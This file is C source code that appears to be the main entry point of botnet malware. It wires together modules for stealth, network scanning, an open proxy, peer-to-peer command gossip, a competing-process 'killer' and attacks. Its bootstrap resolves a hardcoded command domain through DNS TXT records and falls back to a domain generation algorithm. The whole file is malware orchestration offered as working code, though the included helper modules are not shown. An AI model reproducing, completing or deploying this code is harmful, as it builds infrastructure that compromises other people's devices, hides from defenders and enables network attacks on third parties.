#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/select.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>

#include "scanner.h"
#include "proxy.h"
#include "p2p.h"
#include "stealth.h"
#include "killer.h"
#include "attack.h"
#include "dga.h"
#include <arpa/inet.h>

volatile sig_atomic_t stop_flag = 0;

void handle_signal(int sig) {
    (void)sig;
    stop_flag = 1;
}

int main(int argc, char *argv[]) {
    if (argc > 1 && strcmp(argv[1], "--debug") == 0) {
        printf("debug mode\n");
    } else {
        stealth_init(argc, argv);
    }
    
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    attack_init();

    if (!scanner_init()) {
        fprintf(stderr, "scanner: init failed\n");
    } else {
        printf("scanner: ok\n");
    }

    int proxy_sock = proxy_init();
    if (proxy_sock < 0) {
        fprintf(stderr, "proxy: init failed\n");
        return 1;
    }
    printf("proxy: %d\n", PROXY_LISTEN_PORT);

#include "dns.h"

    int p2p_sock = p2p_init();
    if (p2p_sock < 0) {
        fprintf(stderr, "p2p: init failed\n");
    } else {
        printf("p2p: %d\n", P2P_PORT);
        
        p2p_add_neighbor(inet_addr("127.0.0.1"), htons(P2P_PORT));
        
        printf("bootstrap: home\n");
        if (dns_resolve_txt("dht.polydevs.uk") == 0) {
            printf("bootstrap: ok\n");
        } else {
            printf("bootstrap: dga\n");
            char *dga_domain = dga_get_domain();
            printf("dga: %s\n", dga_domain);
            
            if (dns_resolve_txt(dga_domain) == 0) {
                printf("dga: ok\n");
            } else {
                printf("dga: fail\n");
            }
        }
    }

    killer_init();
    printf("killer: ok\n");

    printf("ready\n");
    
    time_t last_gossip = time(NULL);

    while (!stop_flag) {
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(proxy_sock, &read_fds);
        if (p2p_sock >= 0) FD_SET(p2p_sock, &read_fds);

        int max_fd = (proxy_sock > p2p_sock) ? proxy_sock : p2p_sock;

        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 10000; // 10ms

        int activity = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);

        if ((activity < 0) && (errno != EINTR)) {
            perror("Select error");
        }

        // Handle Proxy Traffic
        if (activity > 0) {
            if (FD_ISSET(proxy_sock, &read_fds)) {
                proxy_handle_new_conn(proxy_sock);
            }
            if (p2p_sock >= 0 && FD_ISSET(p2p_sock, &read_fds)) {
                p2p_handle_packet(p2p_sock);
            }
        }

        // Handle Scanner
        scanner_run_batch();

        time_t now = time(NULL);

        // Handle Gossip (60s)
        if (now - last_gossip > (GOSSIP_INTERVAL_MS / 1000)) {
            p2p_gossip(p2p_sock);
            last_gossip = now;
        }

        // Killer runs in background child process (started at init)
    }

    printf("[*] Shutting down...\n");
    killer_kill(); // Stop killer child
    scanner_info();
    close(proxy_sock);
    if (p2p_sock >= 0) close(p2p_sock);

    return 0;
}
